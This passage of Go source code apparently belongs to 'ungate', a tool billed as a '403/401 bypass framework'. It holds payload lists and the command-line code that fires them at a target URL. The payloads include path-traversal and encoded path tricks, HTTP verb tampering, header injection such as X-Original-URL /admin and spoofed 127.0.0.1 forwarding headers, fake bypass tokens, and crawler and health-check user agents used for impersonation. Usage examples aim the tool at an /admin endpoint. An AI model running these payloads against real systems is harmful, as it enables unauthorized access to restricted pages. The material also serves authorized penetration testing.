        "~", "&", "-", ".", "null",
        "false", "true", "debug",
        "0", "1", "???", "?WSDL",
        `\\/\\/`, "/*", "/..%3B/",
        "/..;/../", "/.;/",
}

var payloadMidPaths = []string{
        "%", "%09", "%09%3b", "%09..", "%09;",
        "%20", "%20/", "%23", "%23%3f",
        "%252f%252f", "%252f/", "%26",
        "%2e", "%2e%2e", "%2e%2e%2f", "%2e%2e/", "%2e/",
        "%2f", "%2f%20%23", "%2f%23", "%2f%2f",
        "%2f%3b%2f", "%2f%3b%2f%2f", "%2f%3f", "%2f%3f/", "%2f/",
        "%3b", "%3b%09", "%3b%2f%2e%2e", "%3f",
        "%252e", "%252e%252e", "%252e/", "%252e%252e/",
        "../", ".././../", "/../", "/../../", "/../../../",
        "/..%2f", "/..;/", "/..;/../",
        "/.;/", "/.%2e/", "/%252e/", "/%252e%252e/",
        "/..%252F", "/x/../", "/x/y/../../../",
        "//", "/./", "/..", ";/", "/;/",
        "/%20/", "/%09/", "/.randomstring/", "/..//",
        "/;%09/", "/;%20/",
        ";%2f%2e%2e", ";%2f..", ";/..", ";/../", "/../;/",
        ";foo=bar/", ";x", ";x/",
        "#", "#?",
}

var payloadMethods = []string{
        "GET", "POST", "PUT", "PATCH", "DELETE",
        "HEAD", "OPTIONS", "TRACE", "CONNECT",
        "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE",
        "LOCK", "UNLOCK", "SEARCH", "ACL", "REPORT",
        "VERSION-CONTROL", "CHECKOUT", "CHECKIN", "UNCHECKOUT",
        "MKWORKSPACE", "UPDATE", "LABEL", "MERGE",
        "BASELINE-CONTROL", "MKACTIVITY", "ORDERPATCH",
        "NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE", "POLL",
        "PURGE", "BAN", "REFRESH", "REBIND", "UNBIND",
        "BIND", "MKCALENDAR", "LINK", "UNLINK",
        "ARBITRARY", "FAKE", "INVALID", "RANDOM",
        "BYPASS", "FUZZ", "TEST", "DEBUG",
        "get", "Get", "GeT", "gEt",
        "post", "Post",
        "GET /",
}

var payloadSimpleHeaders = []string{
        "X-HTTP-Method-Override GET",
        "X-HTTP-Method-Override POST",
        "X-HTTP-Method-Override PUT",
        "X-HTTP-Method-Override DELETE",
        "X-HTTP-Method-Override PATCH",
        "X-HTTP-Method GET",
        "X-Method-Override GET",
        "X-Method-Override POST",
        "_method GET",
        "_method POST",
        "X-Original-URL /",
        "X-Original-URL /admin",
        "X-Override-URL /",
        "X-Override-URL /admin",
        "X-Rewrite-URL /",
        "X-Rewrite-URL /admin",
        "X-Forwarded-Path /",
        "X-Forwarded-Prefix /",
        "X-Forwarded-Port 80",
        "X-Forwarded-Port 443",
        "X-Forwarded-Port 4443",
        "X-Forwarded-Port 8080",
        "X-Forwarded-Port 8443",
        "X-Forwarded-Port 8888",
        "X-Forwarded-Proto http",
        "X-Forwarded-Proto https",
        "X-Forwarded-Scheme http",
        "X-Forwarded-Scheme https",
        "X-Url-Scheme https",
        "X-Url-Scheme http",
        "Content-Length 0",
        "Transfer-Encoding chunked",
        "Transfer-Encoding identity",
        "Referer /",
        "Referer /admin",
        "Referer https://localhost/",
        "Cache-Control no-cache",
        "Pragma no-cache",
        "Cache-Control no-store",
        "X-Requested-With XMLHttpRequest",
        "X-Requested-With fetch",
        "X-CSRF-Token bypass",
        "X-Auth-Token bypass",
        "Authorization Bearer bypass",
        "Authorization Basic bypass",
        "X-Api-Key bypass",
        "X-Access-Token bypass",
        "X-Token bypass",
        "X-Custom-Header bypass",
        "X-Bypass 1",
        "X-Debug 1",
        "X-Internal true",
        "X-Admin true",
        "X-Dev true",
        "X-Allow-Access true",
        "X-Forward-For 127.0.0.1",
        "X-Remote-Addr 127.0.0.1",
        "X-Cluster-Client-IP 127.0.0.1",
        "Accept */*",
        "Accept application/json",
        "Accept text/html,application/xhtml+xml",
        "Origin null",
        "Origin https://localhost",
        "Origin http://127.0.0.1",
        "Accept-Encoding gzip",
        "Accept-Encoding identity",
        "Accept-Encoding *",
}

var payloadUserAgents = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Googlebot-Image/1.0",
        "Googlebot-News",
        "Googlebot-Video/1.0",
        "APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)",
        "AdsBot-Google (+http://www.google.com/adsbot.html)",
        "Mediapartners-Google/2.1",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
        "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
        "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
        "Twitterbot/1.0",
        "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
        "WhatsApp/2.24.8.75 A",
        "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
        "TelegramBot (like TwitterBot)",
        "AhrefsBot/7.0; +http://ahrefs.com/robot/",
        "SemrushBot/7; +http://www.semrush.com/bot.html",
        "MJ12bot/v1.4.8 (http://majestic12.co.uk/bot.php)",
        "DotBot/1.2 (https://moz.com/help/moz-procedures/crawling/dotbot)",
        "Nmap Scripting Engine",
        "masscan/1.0",
        "curl/8.5.0",
        "curl/7.88.1",
        "curl/7.64.1",
        "Wget/1.21.4",
        "python-requests/2.31.0",
        "python-urllib3/2.1.0",
        "Go-http-client/1.1",
        "Go-http-client/2.0",
        "Java/17.0.9",
        "Jakarta Commons-HttpClient/3.1",
        "Apache-HttpClient/4.5.14",
        "okhttp/4.12.0",
        "PostmanRuntime/7.37.0",
        "insomnia/9.2.0",
        "",
        "-",
        "*",
        "Mozilla",
        "Mozilla/5.0",
        "internal-service/1.0",
        "health-check/1.0",
        "kube-probe/1.29",
        "ELB-HealthChecker/2.0",
        "Consul Health Check",
        "prometheus/2.50.0",
        "DatadogAgent/7.50.0",
        "updown.io daemon/1.0",
        "StatusCake/2.0",
        "Amazon CloudFront",
        "CloudFront/1.0",
        "Fastly/1.0",
        "Cloudflare-Traffic-Manager/1.0",
}

var payloadContentTypes = []string{
        "application/json",
        "application/json; charset=utf-8",
        "application/json;charset=UTF-8",
        "application/xml",
        "application/xml; charset=utf-8",
        "text/xml",
        "text/xml; charset=utf-8",
        "text/html",
        "text/html; charset=utf-8",
        "text/plain",
        "text/plain; charset=utf-8",
        "text/csv",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "application/octet-stream",
        "application/graphql",
        "application/graphql+json",
        "application/ld+json",
        "application/vnd.api+json",
        "application/hal+json",
        "application/problem+json",
        "application/merge-patch+json",
        "application/json-patch+json",
        "application/grpc",
        "application/grpc+json",
        "application/grpc+proto",
        "application/protobuf",
        "application/x-protobuf",
        "application/msgpack",
        "application/cbor",
        "application/soap+xml",
        "application/soap+xml; action=\"\"",
        "application/wsdl+xml",
        "application/x-javascript",
        "application/javascript",
        "application/x-json",
        "text/json",
        "text/javascript",
        "image/jpeg",
        "image/png",
        "image/gif",
        "image/svg+xml",
        "application/pdf",
        "application/zip",
        "*/*",
        "",
}

// ─────────────────────────────────────────────────────────────────────────────
// CLI
// ─────────────────────────────────────────────────────────────────────────────

type multiFlag []string

func (m *multiFlag) String() string        { return strings.Join(*m, ", ") }
func (m *multiFlag) Set(v string) error    { *m = append(*m, v); return nil }

func main() {
        var (
                flagURI       string
                flagMethod    string
                flagHeaders   multiFlag
                flagProxy     string
                flagBypassIP  string
                flagUserAgent string
                flagTimeout   int
                flagRedirect  bool
                flagStop429   bool
                flagTechs     string
                flagGoroutines int
                flagDelay     int
                flagVerbose   bool
                flagOutput    string
                flagJSON      bool
                flagRandAgent bool
                flagNoColor   bool
                flagVersion   bool
                flagHelp      bool
        )

        flag.StringVar(&flagURI, "u", "", "Target URL (required)")
        flag.StringVar(&flagMethod, "t", "GET", "HTTP method (default: GET)")
        flag.Var(&flagHeaders, "H", "Custom header: 'Key: Value' (repeatable)")
        flag.StringVar(&flagProxy, "x", "", "Proxy: http://127.0.0.1:8080")
        flag.StringVar(&flagBypassIP, "i", "", "Custom IP for header injection")
        flag.StringVar(&flagUserAgent, "a", "", "Custom User-Agent")
        flag.IntVar(&flagTimeout, "timeout", 6000, "Request timeout in ms")
        flag.BoolVar(&flagRedirect, "r", false, "Follow redirects")
        flag.BoolVar(&flagStop429, "l", false, "Stop on 429 rate limit")
        flag.StringVar(&flagTechs, "k", "all", "Techniques (comma-sep) or 'all'")
        flag.IntVar(&flagGoroutines, "g", 50, "Max concurrent goroutines")
        flag.IntVar(&flagDelay, "d", 0, "Delay between requests in ms")
        flag.BoolVar(&flagVerbose, "v", false, "Show all results")
        flag.StringVar(&flagOutput, "o", "", "Save output to file")
        flag.BoolVar(&flagJSON, "json", false, "JSON output")
        flag.BoolVar(&flagRandAgent, "random-agent", false, "Random User-Agent")
        flag.BoolVar(&flagNoColor, "no-color", false, "Disable colors")
        flag.BoolVar(&noBanner, "no-banner", false, "Disable banner")
        flag.BoolVar(&flagVersion, "version", false, "Print version")
        flag.BoolVar(&flagHelp, "h", false, "Show help")
        flag.Usage = printUsage
        flag.Parse()

        if flagVersion {
                fmt.Printf("ungate version %s (built %s)\n", version, buildDate)
                return
        }
        if flagHelp || flagURI == "" {
                printUsage()
                if flagURI == "" && !flagHelp {
                        os.Exit(1)
                }
                return
        }
        if flagNoColor {
                colorEnabled = false
        }

        var proxyURL *url.URL
        if flagProxy != "" {
                if !strings.HasPrefix(flagProxy, "http") {
                        flagProxy = "http://" + flagProxy
                }
                u, err := url.Parse(flagProxy)
                if err != nil {
                        fmt.Fprintf(os.Stderr, "[!] invalid proxy: %v\n", err)
                        os.Exit(1)
                }
                proxyURL = u
        }

        ua := flagUserAgent
        if ua == "" {
                if flagRandAgent {
                        ua = payloadUserAgents[rand.Intn(len(payloadUserAgents))]
                } else {
                        ua = toolName+"/"+version
                }
        }
        headers := []KV{{"User-Agent", ua}}
        for _, h := range flagHeaders {
                parts := strings.SplitN(h, ":", 2)
                if len(parts) == 2 {
                        headers = append(headers, KV{strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])})
                }
        }

        method := strings.ToUpper(flagMethod)
        if method == "" {
                method = "GET"
        }

        allTechs := []string{
                "verbs", "headers", "endpaths", "midpaths",
                "double-encoding", "unicode", "path-case",
                "http-version", "useragent", "host-header", "content-type",
        }
        var techs []string
        if flagTechs == "all" || flagTechs == "" {
                techs = allTechs
        } else {
                for _, t := range strings.Split(flagTechs, ",") {
                        techs = append(techs, strings.TrimSpace(t))
                }
        }

        if err := initOutput(flagOutput, flagJSON); err != nil {
                fmt.Fprintf(os.Stderr, "[!] output error: %v\n", err)
                os.Exit(1)
        }
        defer closeOutput()

        RunScan(ScanOpts{
                URI:        flagURI,
                Method:     method,
                Headers:    headers,
                Proxy:      proxyURL,
                BypassIP:   flagBypassIP,
                Timeout:    flagTimeout,
                Follow:     flagRedirect,
                Stop429:    flagStop429,
                Techniques: techs,
                Goroutines: flagGoroutines,
                Delay:      flagDelay,
                Verbose:    flagVerbose,
        })
}

func printUsage() {
        fmt.Printf("\n  %s\n\n", bold(toolName+" — 403/401 bypass framework v"+version))
        fmt.Printf("  %s  "+toolName+" -u <URL> [options]\n\n", bold("usage:"))
        fmt.Printf("  %s\n", bold("options:"))
        opts := [][2]string{
                {"-u  <url>", "target URL (required)"},
                {"-t  <method>", "HTTP method (default: GET)"},
                {"-H  <header>", "'Key: Value' — repeatable"},
                {"-x  <proxy>", "proxy URL (e.g. http://127.0.0.1:8080)"},
                {"-i  <ip>", "custom IP for header injection"},
                {"-a  <agent>", "custom User-Agent"},
                {"-k  <techs>", "comma-sep techniques or 'all' (default: all)"},
                {"-g  <n>", "max goroutines (default: 50)"},
                {"-d  <ms>", "delay between requests"},
                {"-o  <file>", "save output to file"},
                {"-r", "follow redirects"},
                {"-l", "stop on 429 rate limit"},
                {"-v", "verbose: show all results"},
                {"--json", "JSON output"},
                {"--random-agent", "random User-Agent"},
                {"--no-color", "disable color"},
                {"--no-banner", "disable banner"},
                {"--version", "print version"},
        }
        for _, o := range opts {
                fmt.Printf("    %-20s %s\n", yellow(o[0]), dim(o[1]))
        }
        fmt.Printf("\n  %s\n", bold("techniques:"))
        techs := [][2]string{
                {"verbs", "HTTP verb tampering"},
                {"headers", "IP/header injection"},
                {"endpaths", "path suffix payloads"},
                {"midpaths", "mid-path insertion"},
                {"double-encoding", "double URL encoding"},
                {"unicode", "unicode/overlong UTF-8"},
                {"path-case", "path case switching"},
                {"http-version", "HTTP version bypass"},
                {"useragent", "user-agent spoofing"},
                {"host-header", "host header injection"},
                {"content-type", "content-type fuzzing"},
        }
        for _, t := range techs {
                fmt.Printf("    %-20s %s\n", cyan(t[0]), dim(t[1]))
        }
        fmt.Printf("\n  %s\n", bold("examples:"))
        fmt.Println("    ungate -u https://target.com/admin")
        fmt.Println("    ungate -u https://target.com/admin -k verbs,headers")
        fmt.Println("    ungate -u https://target.com/admin -x http://127.0.0.1:8080 -v")
        fmt.Println("    ungate -u https://target.com/admin -H 'Authorization: Bearer TOKEN' -o out.txt")
        fmt.Println("    ungate -u https://target.com/admin --json -o results.json")
        fmt.Println()
}
